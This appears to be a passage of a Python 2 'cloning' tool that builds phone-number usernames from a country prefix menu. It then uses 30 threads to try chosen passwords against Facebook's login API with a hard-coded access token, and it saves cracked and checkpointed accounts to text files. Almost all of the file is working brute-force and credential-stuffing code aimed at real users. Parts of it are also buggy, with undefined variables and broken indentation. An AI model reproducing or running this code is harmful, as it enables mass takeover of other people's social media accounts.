     ALIEN = raw_input('\n\n \x1b[1;92mCHOOSE ANY COUNTRY>>>>>>>  ') 
     if ALIEN == 'please wait ': 
         print '[!] ' 
         action() 
     elif ALIEN == '1': 
         os.system('clear') 
         print logo 
         print ('\x1b\033[1;36m   BANGLADESH')  
         print ('\033[93;1m _______________________________________________________________________________ \33') 
         print '\n\x1b[1;36m  175 , 165 , 191 , 192 , 193 , 194 , 195 , 196 , 197 , 198 , 199' 
         print ('\033[93;1m _______________________________________________________________________________ \33') 
         try: 
             c = raw_input('\n\x1b[1;92m choose any code  : ') 
             k = '+880' 
             idlist = '.txt' 
             for line in open(idlist, 'r').readlines(): 
                 id.append(line.strip()) 
  
         except IOError: 
             print '[!] File Not Found' 
             raw_input('\n[ Back ]') 
             ALIEN() 
  
     elif ALIEN == '2': 
         os.system('clear') 
         print logo 
         print ('\x1b\033[1;36m   AMERICA')  
         print ('\033[93;1m _______________________________________________________________________________ \33') 
         print '\n\x1b[1;36m   555 , 786 , 815 , 315 , 256 , 401 , 718 , 917 , 202 , 701 , 303 , 703 , 803 , 999 , 708 , 559 , 310 , 809 , 551' 
         print ('\033[93;1m _______________________________________________________________________________ \33') 
         try: 
             c = raw_input('\n\x1b[1;92m choose any code  : ') 
             k = '+1' 
             idlist = '.txt' 
             for line in open(idlist, 'r').readlines(): 
                 id.append(line.strip()) 
  
         except IOError: 
             print '[!] File Not Found' 
             raw_input('\n[ Back ]') 
             ALIEN() 
  
     elif ALIEN == '3': 
         os.system('clear') 
         print logo 
         print ('\x1b[1;36m   UNITED KINGDOM')  
         print ('\033[93;1m _______________________________________________________________________________ \33') 
         print '\n\x1b[1;36m   715 , 785 , 765 , 725 , 745 ,735 , 737 , 706 , 748 , 783 , 739 , 759 , 790' 
         print ('\033[93;1m _______________________________________________________________________________ \33') 
         try: 
             c = raw_input(' \n\x1b[1;92mchoose any code  : ') 
             k = '+44' 
             idlist = '.txt' 
             for line in open(idlist, 'r').readlines(): 
                 id.append(line.strip()) 
  
         except IOError: 
             print '[!] File Not Found' 
             raw_input('\n[ Back ]') 
             ALIEN() 
  
     elif ALIEN == '4': 
         os.system('clear') 
         print logo 
         print ('\x1b[1;36m   INDIA')  
         print ('\033[93;1m _______________________________________________________________________________ \33') 
         print '\n\x1b[1;36m  905 , 975 , 755 , 855 , 954, 897, 967, 937, 700, 727, 965, 786 , 874 , 856 , 566 , 590 , 527 , 568 , 578' 
         print ('\033[93;1m _______________________________________________________________________________ \33') 
         try: 
             c = raw_input(' \n\x1b[1;92mchoose code  : ') 
             k = '+91' 
             idlist = '.txt' 
             for line in open(idlist, 'r').readlines(): 
                 id.append(line.strip()) 
  
         except IOError: 
             print '[!] File Not Found' 
             raw_input('\n[ Back ]') 
             ALIEN() 
  
     elif ALIEN == '5': 
         os.system('clear') 
         print logo 
         print ('\x1b[1;36m   BRAZIL')  
         print ('\033[93;1m _______________________________________________________________________________ \33') 
         print '\n\x1b[1;96m  127 , 179 , 117 , 853 , 318 , 219 , 834 , 186 , 479 , 113' 
         print ('\033[93;1m _______________________________________________________________________________ \33') 
         try: 
             c = raw_input('\n\x1b[1;92m choose code  : ') 
             k = '+55' 
             idlist = '.txt' 
             for line in open(idlist, 'r').readlines(): 
                 id.append(line.strip()) 
  
         except IOError: 
             print '[!] File Not Found' 
             raw_input('\n[ Back ]') 
             ALIEN() 
  
     elif ALIEN == '6': 
         os.system('clear') 
         print logo 
         print ('\x1b[1;36m   JAPAN')  
         print ('\033[93;1m _______________________________________________________________________________ \33') 
         print '\n\x1b[1;36m  11 , 12 , 19 , 16 , 15 , 13 , 14 , 18 , 17' 
         print ('\033[93;1m _______________________________________________________________________________ \33') 
         try: 
             c = raw_input('\n\x1b[1;92m choose any code  : ') 
             k = '+81' 
             idlist = '.txt' 
             for line in open(idlist, 'r').readlines(): 
                 id.append(line.strip()) 
  
         except IOError: 
             print '[!] File Not Found' 
             raw_input('\n[ Back ]') 
             ALIEN() 
  
     elif ALIEN == '7': 
         os.system('clear') 
         print logo 
         print ('\x1b[1;36m   KOREA')  
         print ('\033[93;1m _______________________________________________________________________________ \33') 
         print '\n\x1b[1;96m   1 , 2 , 3 , 4 , 5 , 6 , 7 , 8 , 9' 
         print ('\033[93;1m _______________________________________________________________________________ \33') 
         try: 
             c = raw_input('\n\x1b[1;92m choose any code  : ') 
             k = '+82' 
             idlist = '.txt' 
             for line in open(idlist, 'r').readlines(): 
                 id.append(line.strip()) 
  
         except IOError: 
             print '[!] File Not Found' 
             raw_input('\n[ Back ]') 
             ALIEN() 
  
     elif ALIEN == '8': 
         os.system('clear') 
         print logo 
         print ('\x1b[1;36m   ITALY')  
         print ('\033[93;1m _______________________________________________________________________________ \33') 
         print '\n\x1b[1;36m  311 , 323 , 385 , 388 , 390 , 391 , 371 , 380 , 368 , 386 , 384 , 332 , 344 , 351 , 328' 
         print ('\033[93;1m _______________________________________________________________________________ \33') 
         try: 
             c = raw_input('\n\x1b[1;92m choose any code  : ') 
             k = '+39' 
             idlist = '.txt' 
             for line in open(idlist, 'r').readlines(): 
                 id.append(line.strip()) 
  
         except IOError: 
             print '[!] File Not Found' 
             raw_input('\n[ Back ]') 
             ALIEN() 
  
     elif ALIEN == '9': 
         os.system('clear') 
         print logo 
         print ('\x1b[1;36m   SPAIN')  
         print ('\033[93;1m _______________________________________________________________________________ \33') 
         print '\n\x1b[1;36m  655,755,60, 76, 73, 64, 69, 77, 65, 61, 75, 68' 
         print ('\033[93;1m _______________________________________________________________________________ \33') 
         try: 
             c = raw_input('\n\x1b[1;95m choose code  : ') 
             k = '+34' 
             idlist = '.txt' 
             for line in open(idlist, 'r').readlines(): 
                 id.append(line.strip()) 
  
         except IOError: 
             print '[!] File Not Found' 
             raw_input('\n[ Back ]') 
             ALIEN() 
  
     elif ALIEN == '10': 
         os.system('clear') 
         print logo 
         print ('\x1b[1;36m   POLAND')  
         print ('\033[93;1m _______________________________________________________________________________ \33') 
         print '\n\x1b[1;36m  66, 69, 78, 79, 60, 72, 67, 53, 51' 
         print ('\033[93;1m _______________________________________________________________________________ \33') 
         try: 
             c = raw_input('\n\x1b[1;95m choose code  : ') 
             k = '+48' 
             idlist = '.txt' 
             for line in open(idlist, 'r').readlines(): 
                 id.append(line.strip()) 
  
         except IOError: 
             print '[!] File Not Found' 
             raw_input('\n[ Back ]') 
             ALIEN() 
  
     elif ALIEN == '11': 
         os.system('clear') 
         print logo 
         print ('\x1b[1;36m   PAKISTAN')  
         print ('\033[93;1m _______________________________________________________________________________ \33') 
         print '\n\x1b[1;36m  01, ~to~~, 49' 
         print ('\033[93;1m _______________________________________________________________________________ \33') 
         try: 
             c = raw_input('\n\x1b[1;95m choose code  : ') 
             k = '03' 
             idlist = '.txt' 
             for line in open(idlist, 'r').readlines(): 
                 id.append(line.strip()) 
  
         except IOError: 
             print '[!] File Not Found' 
             raw_input('\n[ Back ]') 
             ALIEN() 
  
     elif ALIEN == '12': 
         os.system('clear') 
         print logo 
         print ('\x1b[1;36m   INSONASIA')  
         print ('\033[93;1m _______________________________________________________________________________ \33') 
         print '\n\x1b[1;36m  81,83,85,84,89,' 
         print ('\033[93;1m _______________________________________________________________________________ \33') 
         try: 
             c = raw_input('\n\x1b[1;95m choose code  : ') 
             k = '+880' 
             idlist = '.txt' 
             for line in open(idlist, 'r').readlines(): 
                 id.append(line.strip()) 
  
         except IOError: 
             print '[!] File Not Found' 
             raw_input('\n[ Back ]') 
             ALIEN() 
  
     elif ALIEN == '13': 
         os.system('clear') 
         print logo 
         print ('\x1b[1;36m   PERU')  
         print ('\033[93;1m _______________________________________________________________________________ \33') 
         print '\n\x1b[1;36m  (leave the first four digits and the last seven digits of any phone number in this country.Write the remaining digits here.91,92,93,94,95,96,97,98,99' 
         print ('\033[93;1m _______________________________________________________________________________ \33') 
         try: 
             c = raw_input('\n\x1b[1;95m choose code  : ') 
             k = '+51' 
             idlist = '.txt' 
             for line in open(idlist, 'r').readlines(): 
                 id.append(line.strip()) 
  
         except IOError: 
             print '[!] File Not Found' 
             raw_input('\n[ Back ]') 
             ALIEN() 
  
     elif ALIEN == '14': 
         os.system('clear') 
         print logo 
         print ('\x1b[1;36m   AUSTRALIA')  
         print ('\033[93;1m _______________________________________________________________________________ \33') 
         print '\n\x1b[1;36m  (leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.455' 
         print ('\033[93;1m _______________________________________________________________________________ \33') 
         try: 
             c = raw_input('\n\x1b[1;95m choose code  : ') 
             k = '+61' 
             idlist = '.txt' 
             for line in open(idlist, 'r').readlines(): 
                 id.append(line.strip()) 
  
         except IOError: 
             print '[!] File Not Found' 
             raw_input('\n[ Back ]') 
             ALIEN() 
  
     elif ALIEN == '15': 
         os.system('clear') 
         print logo 
         print ('\x1b[1;36m   CANADA')  
         print ('\033[93;1m _______________________________________________________________________________ \33') 
         print '\n\x1b[1;36m  (leave the first one digits and the last seven digits of any phone number in this country.Write the remaining digits here.555,' 
         print ('\033[93;1m _______________________________________________________________________________ \33') 
         try: 
             c = raw_input('\n\x1b[1;95m choose code  : ') 
             k = '+1' 
             idlist = '.txt' 
             for line in open(idlist, 'r').readlines(): 
                 id.append(line.strip()) 
  
         except IOError: 
             print '[!] File Not Found' 
             raw_input('\n[ Back ]') 
             ALIEN() 
  
     elif ALIEN == '16': 
         os.system('clear') 
         print logo 
         print ('\x1b[1;36m   CHINA')  
         print ('\033[93;1m _______________________________________________________________________________ \33') 
         print '\n\x1b[1;36m  (leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.1355,1555,1855,' 
         print ('\033[93;1m _______________________________________________________________________________ \33') 
         try: 
             c = raw_input(' \n\x1b[1;92mchoose code  : ') 
             k = '+86' 
             idlist = '.txt' 
             for line in open(idlist, 'r').readlines(): 
                 id.append(line.strip()) 
  
         except IOError: 
             print '[!] File Not Found' 
             raw_input('\n[ Back ]') 
             ALIEN() 
  
     elif ALIEN == "17'": 
         os.system('clear') 
         print logo 
         print ('\x1b[1;36m   DENMARK')  
         print ('\033[93;1m _______________________________________________________________________________ \33') 
         print '\n\x1b[1;36m  (leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.2,3,4,5,6,7,8' 
         print ('\033[93;1m _______________________________________________________________________________ \33') 
         try: 
             c = raw_input(' \n\x1b[1;92mchoose code  : ') 
             k = '+45' 
             idlist = '.txt' 
             for line in open(idlist, 'r').readlines(): 
                 id.append(line.strip()) 
  
         except IOError: 
             print '[!] File Not Found' 
             raw_input('\n[ Back ]') 
             ALIEN() 
  
     elif ALIEN == '18': 
         os.system('clear') 
         print logo 
         print ('\x1b[1;36m   FARANCE')  
         print ('\033[93;1m _______________________________________________________________________________ \33') 
         print '\n\x1b[1;36m  (leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.65,70,73,74,76,77' 
         print ('\033[93;1m _______________________________________________________________________________ \33') 
         try: 
             c = raw_input('\n\x1b[1;92m choose code  : ') 
             k = '+33' 
             idlist = '.txt' 
             for line in open(idlist, 'r').readlines(): 
                 id.append(line.strip()) 
  
         except IOError: 
             print '[!] File Not Found' 
             raw_input('\n[ Back ]') 
             ALIEN() 
  
     elif ALIEN == '19': 
         os.system('clear') 
         print logo 
         print ('\x1b[1;36m   GERMANY')  
         print ('\033[93;1m _______________________________________________________________________________ \33') 
         print '\n\x1b[1;36m  (leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.151,152,153,155,157,159,160,162,179,163,174,163' 
         print ('\033[93;1m _______________________________________________________________________________ \33') 
         try: 
             c = raw_input('\n\x1b[1;92m choose code  : ') 
             k = '+49' 
             idlist = '.txt' 
             for line in open(idlist, 'r').readlines(): 
                 id.append(line.strip()) 
  
         except IOError: 
             print '[!] File Not Found' 
             raw_input('\n[ Back ]') 
             ALIEN() 
  
     elif ALIEN == '20': 
         os.system('clear') 
         print ('\x1b[1;36m   MALAYSIA')  
         print ('\033[93;1m _______________________________________________________________________________ \33') 
         print '\n\x1b[1;36m  (leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.11,12,13,14,15,16,17,18,19' 
         print ('\033[93;1m _______________________________________________________________________________ \33') 
         try: 
             c = raw_input('\n\x1b[1;92m choose code  : ') 
             k = '+60' 
             idlist = '.txt' 
             for line in open(idlist, 'r').readlines(): 
                 id.append(line.strip()) 
  
         except IOError: 
             print '[!] File Not Found' 
             raw_input('\n[ Back ]') 
             ALIEN() 
  
     elif ALIEN == '21': 
         os.system('clear') 
         print ('\x1b[1;36m   SIRILANKA')  
         print ('\033[93;1m _______________________________________________________________________________ \33') 
         print '\n\x1b[1;36m  (leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.71,72,73,74,75,76,77,78' 
         print ('\033[93;1m _______________________________________________________________________________ \33') 
         try: 
             c = raw_input('\n\x1b[1;92m choose code  : ') 
             k = '+94' 
             idlist = '.txt' 
             for line in open(idlist, 'r').readlines(): 
                 id.append(line.strip()) 
  
         except IOError: 
             print '[!] File Not Found' 
             raw_input('\n[ Back ]') 
             ALIEN() 
  
     elif ALIEN == '22': 
         os.system('clear') 
         print logo 
         print ('\x1b[1;36m   TURKEY')  
         print ('\033[93;1m _______________________________________________________________________________ \33') 
         print '\n\x1b[1;36m  (leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.55,54,53,52,50' 
         print ('\033[93;1m _______________________________________________________________________________ \33') 
         try: 
             c = raw_input('\n\x1b[1;92m choose code  : ') 
             k = '+90' 
             idlist = '.txt' 
             for line in open(idlist, 'r').readlines(): 
                 id.append(line.strip()) 
  
         except IOError: 
             print '[!] File Not Found' 
             raw_input('\n[ Back ]') 
             ALIEN() 
  
     elif ALIEN == '23': 
         os.system('clear') 
         print logo 
         print ('\x1b[1;36m   U.A.E')  
         print ('\033[93;1m _______________________________________________________________________________ \33') 
         print '\n\x1b[1;36m  (leave the first tree digits and the last seven digits of any phone number in this country.Write the remaining digits here.50,55,58,54,56' 
         print ('\033[93;1m _______________________________________________________________________________ \33') 
         try: 
             c = raw_input('\n\x1b[1;92m choose code  : ') 
             k = '+971' 
             idlist = '.txt' 
             for line in open(idlist, 'r').readlines(): 
                 id.append(line.strip()) 
  
         except IOError: 
             print '[!] File Not Found' 
             raw_input('\n[ Back ]') 
             ALIEN() 
  
     elif ALIEN == '24': 
         os.system('clear') 
         print logo 
         print ('\x1b[1;36m   SAUDI ARABIA')  
         print ('\033[93;1m _______________________________________________________________________________ \33') 
         print '\n\x1b[1;36m  (leave the first three digits and the last seven digits of any phone number in this country.Write the remaining digits here.50,51,52,53,54,55,56,57,58,' 
         print ('\033[93;1m _______________________________________________________________________________ \33') 
         try: 
             c = raw_input('\n\x1b[1;92m choose code  : ') 
             k = '+966' 
             idlist = '.txt' 
             for line in open(idlist, 'r').readlines(): 
                 id.append(line.strip()) 
  
         except IOError: 
             print '[!] File Not Found' 
             raw_input('\n[ Back ]') 
             ALIEN() 
  
     elif ALIEN == '25': 
         os.system('clear') 
         print logo 
         print ('\x1b[1;36m   ISRAEL')  
         print ('\033[93;1m _______________________________________________________________________________ \33') 
         print '\n\x1b[1;36m  (leave the first three digits and the last seven digits of any phone number in this country.Write the remaining digits here. 52,55' 
         print ('\033[93;1m _______________________________________________________________________________ \33') 
         try: 
             c = raw_input('\n\x1b[1;92m choose code  : ') 
             k = '+972' 
             idlist = '.txt' 
             for line in open(idlist, 'r').readlines(): 
                 id.append(line.strip()) 
  
         except IOError: 
             print '[!] File Not Found' 
             raw_input('\n[ Back ]') 
             ALIEN() 
  
     elif ALIEN == '26': 
         os.system('clear') 
         print logo 
         print ('\x1b[1;36m')  
         print ('\033[93;1m _______________________________________________________________________________ \33') 
         print '\n\x1b[1;36m  (leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.990,915,901,933,938,902' 
         print ('\033[93;1m _______________________________________________________________________________ \33') 
         try: 
             c = raw_input('\n\x1b[1;92m choose code  : ') 
             k = '+98' 
             idlist = '.txt' 
             for line in open(idlist, 'r').readlines(): 
                 id.append(line.strip()) 
  
         except IOError: 
             print '[!] File Not Found' 
             raw_input('\n[ Back ]') 
             ALIEN() 
  
     elif ALIEN == '00': 
         login() 
     else: 
         print '\n\x1b[1;91m[*] PLEASE SELECT ANY VALID NUMBER DONT USE 0 BEFORE THE NUMBER LIKE TYPE 1 NOT 01, THANKS (ALIENBOY)' 
         action() 
     print ('\033[93;1m _______________________________________________________________________________ \33')   
     print '\n\x1b[1;36m  Select Random Password Maximum 6 Digits '     
     ALIEN = raw_input('\n\x1b[1;92m TYPE ANY PASSWORD NO1: ')   
     ALIENr = raw_input('\n\x1b[1;92m TYPE ANY PASSWORD NO2 : ')     
     ALIENrr = raw_input('\n\x1b[1;92m TYPE ANY PASSWORD NO3 :')     
     ALIENrrr = raw_input('\n\x1b[1;92m TYPE ANY PASSWORD NO4 : ') 
     print ('\033[93;1m _______________________________________________________________________________ \33') 
     xxx = str(len(id)) 
     psb('\x1b[0;96m TOTAL NUMBERS: ' + '60000') 
     time.sleep(0.5) 
     psb('\x1b[0;96m PLEASE WAIT, PROCESS IS START...') 
     time.sleep(0.5) 
     psb('\n\033[1;36m[!]\x1b[0;96m TO STOP THIS PROCESS PRESS \033[1;33mCtrl THEN z') 
     time.sleep(0.5) 
     print ('\033[93;1m _______________________________________________________________________________ \33') 
     psb('\n\x1b[1;91m       TOOL STATED CLONING PLEASE WAIT ') 
     print ('\033[93;1m _______________________________________________________________________________ \33') 
     print 
  
     def main(arg): 
         user = arg 
         try: 
             os.mkdir('save') 
         except OSError: 
             pass 
  
         try: 
             pass1 = user 
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm') 
             q = json.load(data) 
             if 'access_token' in q: 
                 print '\x1b[1;92m[\x1b[1;92mAUTO PASS-SUCCESSFULL] \x1b[1;92m  ' + k + c + user + '\x1b[1;92m >>> \x1b[1;92m' + pass1 + ' \x1b[1;92m[LOG IN NOW]' + '\n' + '\n' 
                 okb = open('save/successfull.txt', 'a') 
                 okb.write(k + c + user + '|' + pass1 + '\n') 
                 okb.close() 
                 oks.append(c + user + pass1) 
             elif 'www.facebook.com' in q['error_msg']: 
                 print '\x1b[1;93m[AUTO PASS-CHECKPOINT] \x1b[1;93m  ' + k + c + user + '\x1b[1;93m >>> \x1b[1;91m' + pass1 + ' \x1b[1;93m[LOG IN AFTER 80 HOURS]' + '\n' 
                 cps = open('save/checkpoint.txt', 'a') 
                 cps.write(k + c + user + '|' + pass1 + '\n') 
                 cps.close() 
                 cpb.append(c + user + pass1) 
             else: 
                 pass2 = alien 
                 data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm') 
                 q = json.load(data) 
                 if 'access_token' in q: 
                     print '\x1b[\x1b[1;92mOWN PASS-SUCCESSFULL] \x1b[1;92m  ' + k + c + user + '\x1b[1;92m >>> \x1b[1;92m' + pass2 + ' \x1b[1;92m[LOG IN NOW]' + '\n' + '\n' 
                     okb = open('save/successfull.txt', 'a') 
                     okb.write(k + c + user + '|' + pass2 + '\n') 
                     okb.close() 
                     oks.append(c + user + pass2) 
                 elif 'www.facebook.com' in q['error_msg']: 
                     print '\x1b[1;93m[OWN PASS-CHECKPOINT] \x1b[1;93m  ' + k + c + user + '\x1b[1;93m >>> \x1b[1;93m' + pass2 + ' \x1b[1;93m[LOG IN AFTER 80 HOURS]' + '\n' 
                     cps = open('save/checkpoint.txt', 'a') 
                     cps.write(k + c + user + '|' + pass2 + '\n') 
                     cps.close() 
                     cpb.append(c + user + pass2) 
                 else: 
                     pass3 = alienr 
                     data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm') 
                     q = json.load(data) 
                     if 'access_token' in q: 
                         print '\x1b[\x1b[1;92mOWN PASS-SUCCESSFULL] \x1b[1;92m  ' + k + c + user + '\x1b[1;92m >>> \x1b[1;92m' + pass3 + ' \x1b[1;96m[LOG IN NOW]' + '\n' + '\n' 
                         okb = open('save/successfull.txt', 'a') 
                         okb.write(k + c + user + '|' + pass3 + '\n') 
                         okb.close() 
                         oks.append(c + user + pass3) 
                     elif 'www.facebook.com' in q['error_msg']: 
                         print '\x1b[1;93m[OWN PASS-CHECKPOINT] \x1b[1;93m  ' + k + c + user + '\x1b[1;93m >>> \x1b[1;93m' + pass3 + ' \x1b[1;93m[LOG IN AFTER 80 HOURS]' + '\n' 
                         cps = open('save/checkpoint.txt', 'a') 
                         cps.write(k + c + user + '|' + pass3 + '\n') 
                         cps.close() 
                         cpb.append(c + user + pass3) 
                     else: 
                         pass4 = alienrr 
                         data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm') 
                         q = json.load(data) 
                         if 'access_token' in q: 
                             print '\x1b[1;92m[\x1b[1;92mOWN PASS-SUCCESSFULL] \x1b[1;92m  ' + k + c + user + '\x1b[1;92m >>> \x1b[1;92m' + pass4 + ' \x1b[1;96m[LOG IN NOW]' + '\n' + '\n' 
                             okb = open('save/successfull.txt', 'a') 
                             okb.write(k + c + user + '|' + pass4 + '\n') 
                             okb.close() 
                             oks.append(c + user + pass4) 
                         elif 'www.facebook.com' in q['error_msg']: 
                             print '\x1b[1;93m[OWN PASS-CHECKPOINT] \x1b[1;93m  ' + k + c + user + '\x1b[1;93m >>> \x1b[1;93m' + pass4 + ' \x1b[1;93m[LOG IN AFTER 80 HOURS]' + '\n' 
                             cps = open('save/checkpoint.txt', 'a') 
                             cps.write(k + c + user + '|' + pass4 + '\n') 
                             cps.close() 
                             cpb.append(c + user + pass4) 
                             pass5 = alienrrr 
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm') 
             q = json.load(data) 
             if 'access_token' in q: 
                 print '\x1b[\x1b[1;92mOWN PASS-SUCCESSFULL] \x1b[1;92m  ' + k + c + user + '\x1b[1;92m >>> \x1b[1;92m' + pass5 + ' \x1b[1;93m[LOG IN NOW]' + '\n' + '\n' 
                 okb = open('save/successfull.txt', 'a') 
                 okb.write(k + c + user + '>>>' + pass5 + '\n') 
                 okb.close() 
                 oks.append(c + user + pass5) 
             elif 'www.facebook.com' in q['error_msg']: 
                 print '\x1b[1;93m[OWN PASS-CHECKPOINT] \x1b[1;93m  ' + k + c + user + '\x1b[1;93m >>> \x1b[1;93m' + pass5 + ' \x1b[1;93m[LOG IN AFTER 80 HOURS]' + '\n' 
                 cps = open('save/checkpoint.txt', 'a') 
                 cps.write(k + c + user + '|' + pass5 + '\n') 
                 cps.close() 
                 cpb.append(c + user + pass5) 
         except: 
             pass 
  
     p = ThreadPool(30) 
     p.map(main, id) 
     print ('\033[93;1m _______________________________________________________________________________ \33') 
     print '[\xe2\x9c\x93] \n\x1b[1;92mPROCESS HAS BEEN COMPLETED....' 
     print '[\xe2\x9c\x92] \x1b[1;92mTOTAL SUCCESSFULL/CHECKPOINT : ' + str(len(oks)) + '/' + str(len(cpb)) 
     print '[\xe2\x9c\x93] \x1b[1;92mCP FILE HAS BEEN SAVED : save/checkpoint.txt' 
     raw_input('\n[\x1b[1;96mPRESS ENTER TO GO BACK]') 
     os.system('python2 world.py') 
  
  
 if __name__ == '__main__': 
     menu()
